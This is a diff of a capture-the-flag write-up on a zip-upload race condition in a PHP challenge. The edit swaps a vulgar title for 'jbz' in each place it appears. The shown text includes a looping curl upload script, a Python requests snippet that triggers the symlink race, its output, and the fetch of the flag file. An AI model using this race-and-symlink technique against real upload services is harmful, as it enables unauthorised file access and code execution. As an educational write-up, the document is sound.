@@ -86,7 +86,7 @@ Finding the **race condition** is trivial, first of all let's analyze what the P
  2. The uploaded zip is extracted in the created dir
  3. All extracted files are processed and the ones which have not an allowed extension are deleted
  4. An index.php file is created to show all uploaded pictures
- 5. A symlink in the webroot which points to the /tmp/name || /tmp/title dir is created
+ 5. A symlink in the webroot which points to the `/tmp/name || /tmp/title` dir is created
  
 We can exploit this procedure as:
   - If you upload 2 ZIP files with the same title they are written to the same directory and both symlink points to the same location
@@ -121,7 +121,7 @@ We upload 2.zip using the title "jbz".
 
 We start submitting 1.zip in loop with a simple bash script.
 
-    while true; do curl -s -o /dev/null -F "title=merda" -F "create=" -F "file=@1.zip" 'http://challenge.uiuc.tf:8888/upload.php'; done
+    while true; do curl -s -o /dev/null -F "title=jbz" -F "create=" -F "file=@1.zip" 'http://challenge.uiuc.tf:8888/upload.php'; done
 
 We create a script to check if 999999.php is there and execute an arbitrary command.
 
@@ -133,7 +133,7 @@ import requests
 def new_symlink():
     url = "http://challenge.uiuc.tf:8888/upload.php"
     files = {'file': open('2.zip', 'rb')}
-    values = {'title': 'merda', 'create' : ''}
+    values = {'title': 'jbz', 'create' : ''}
         r = requests.post(url, files=files, data=values)
     print r.url
     return r.url
@@ -155,7 +155,7 @@ After a while (damn!) we won the race and got this:
 
 ```
 smaury@hitch-hicker:/tmp/$ python create.py
-http://challenge.uiuc.tf:8888/uploads/merda_9wz7hmnn3bk/
+http://challenge.uiuc.tf:8888/uploads/jbz_9wz7hmnn3bk/
 total 220K
 drwxr-xr-x 4 root     root     4.0K Apr 29 17:07 .
 drwxr-xr-x 4 root     root     4.0K Apr 29 17:07 ..
@@ -167,7 +167,7 @@ drwxr-xr-x 2 www-data www-data 196K Apr 30 05:20 uploads
 WON the race!!
 ```
     
-After visiting http://challenge.uiuc.tf:8888/uploads/merda_9wz7hmnn3bk/9d8bf193d88e4d3ab5fca4d7cb2d573f/ we saw that the directory listing was available and that there was a flag file:
+After visiting http://challenge.uiuc.tf:8888/uploads/jbz_9wz7hmnn3bk/9d8bf193d88e4d3ab5fca4d7cb2d573f/ we saw that the directory listing was available and that there was a flag file:
 
 ```bash
 curl http://challenge.uiuc.tf:8888/9d8bf193d88e4d3ab5fca4d7cb2d573f/flag
